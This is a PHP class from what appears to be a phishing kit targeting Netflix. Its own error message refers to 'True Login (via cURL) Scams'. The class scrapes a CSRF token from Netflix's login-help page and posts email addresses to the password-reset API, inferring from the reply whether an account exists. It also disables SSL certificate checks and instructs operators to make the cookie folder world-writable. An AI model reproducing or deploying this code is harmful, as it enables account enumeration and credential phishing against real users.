<?php
/**
 * Created by PhpStorm.
 * User: trovaz
 * Date: 03/09/2017
 * Time: 14:59
 */


class Injector
{
    private $ch = NULL;
    private $cookie = NULL;
    private $userAgent = NULL;
    private static $newInstance = NULL;
    private $codeCsrf = NULL;
    private $ll = NULL;

    private function __construct()
    {
        $lang = array("ma-en", "fr-fr", "fr-en");
        $this->userAgent = Activity::getActivity()->getUserAgent();
        $this->cookie = $this->cookieFolder() . "trvz-" . Activity::getIp() . ".txt";
        if (file_exists($this->cookie)) {
            @unlink($this->cookie);
        }
        $this->codeCsrf = $this->getValue($this->get("https://www.netflix.com/" . $this->ll . "/LoginHelp", "https://www.netflix.com/login"), "authURL\":\"", "\"");
        $this->ll = $lang[mt_rand(0, count($lang) - 1)];
    }


    public static function newInstance()
    {
        if (!self::$newInstance) {
            try {
                self::$newInstance = new Injector();
            } catch (Exception $e) {
                echo "Error : " . $e->getMessage();
            }
        }
        return self::$newInstance;
    }

    private function cookieFolder()
    {
        $return = __DIR__ . "/../cookie/";
        return $return;
    }

    public function checkPermission()
    {
        if (!extension_loaded('curl') || !function_exists('curl_init')) {
            self::curlError();
        }
        $rnd = rand(1000, 9999);
        $testfile = $this->cookieFolder() . "/" . $rnd . "-test.txt";
        if (@fclose(@fopen($testfile, "a"))) {
            @unlink($testfile);
        } else {
            self::dirPermissionError($this->cookieFolder());
        }
    }

    public static function dirPermissionError($file)
    {
        die('<html bgcolor="#E8E8E8">
                      <br><br>
                      <table align="center" width="750" height="100" border="0">
                      <tr><td>
                      <font color="#000000" FACE="Verdana" SIZE="2">
                      <strong>WE NEED PERMISSIONS TO WRITE COOKIES . <br><br>CHMOD THIS FILE/DIRECTORY (' . $file . ') TO 777.</strong>
                      </font>
                      <br><br>Example: chmod 777 ' . $file . '
	            </html>');

    }

    public static function curlError()
    {
        die ('<html>
                      <body bgcolor="#E8E8E8">
                          <br><br>
                          <table align="center" width="750" height="100" border="0">
                              <tr><td><font color="#000000" FACE="Verdana" SIZE="2">
                                  <strong>CURL NOT AVAILABLE</strong>
                                  <br><br>
                                  Open a plain text file, add the following lines, and save it as info.php, then run it from your browser.<br><br>
                                  <code>
                                      &lt;?php<br><br>phpinfo();<br><br>?&gt;
                                  </code>
                                  <br><br><b>NOTE:</b> True Login (via cURL) Scams must to be uploaded onto hosting webserver which has cURL enabled.
                              </td></tr></font>
                          </table>
                      </body>
                  </html>');

    }


    private function doRequest($method, $url, $referer, $vars = NULL, $verbose = 0, $header = 0)
    {
        $this->ch = curl_init();
        $config = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_COOKIEJAR => $this->cookie,
            CURLOPT_COOKIEFILE => $this->cookie,
            CURLOPT_USERAGENT => "'" . $this->userAgent . "'",
            CURLOPT_FOLLOWLOCATION => 1,
        );
        curl_setopt_array($this->ch, $config);

        if ($referer != "") {
            curl_setopt($this->ch, CURLOPT_REFERER, $referer);
        }
        if ($verbose != 0) {
            curl_setopt($this->ch, CURLOPT_VERBOSE, $verbose);
        }
        if ($header != 0) {
            curl_setopt($this->ch, CURLOPT_HTTPHEADER, $header);
        }
        if ($method == 'POST') {
            curl_setopt($this->ch, CURLOPT_POST, 1);
            curl_setopt($this->ch, CURLOPT_POSTFIELDS, $vars);
        }
        if (substr($url, 0, 5) == "https") {
            curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, 2);
        }
        $str = curl_exec($this->ch);
        if ($str) {
            return $str;
        } else {
            return curl_error($this->ch);
        }
    }

    public function get($url, $referer)
    {
        return $this->doRequest('GET', $url, $referer);
    }

    private function post($url, $referer, $vars, $headers = 0)
    {
        return $this->doRequest('POST', $url, $referer, $vars, 0, $headers);
    }


    public function check($email)
    {
//        $headers = array(
//            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
//            'Accept-Encoding: gzip, deflate, br',
//            'Accept-Language: en-US,en;q=0.5',
//            'Connection: keep-alive',
//            'DNT: 1',
//            'Content-Type: application/json',
//            'Host: www.netflix.com',
//            'Upgrade-Insecure-Requests: 1',
//
//        );

        $data_string = array(
            "fields" => array("forgotPasswordChoice" => array("value" => "email"), "email" => $email),
            "mode" => "enterPasswordReset",
            "action" => "nextAction",
            "authURL" => "' . $this->codeCsrf . '"
        );
        $post = json_encode($data_string);
        $header = array(
            'Content-Type: application/json',
            'Content-Length: ' . strlen($post));

        $response =  $this->post("https://www.netflix.com/api/shakti/c5f5180e/login/help", "https://www.netflix.com/" . $this->ll . "/LoginHelp", $post , $header);

        $object = json_decode($response);
        echo $object->mode;
        if($object->mode == "enterPasswordReset"){
            return -1;
        }else{
            $this->close();
            return 1;
        }



    }


    private function getValue($string, $begin, $end)
    {
        preg_match("'$begin(.*?)$end'si", $string, $match);
        if ($match) return $match[1]; else return false;
    }


    private function close()
    {
        curl_close($this->ch);
        @unlink($this->cookie);
    }


}
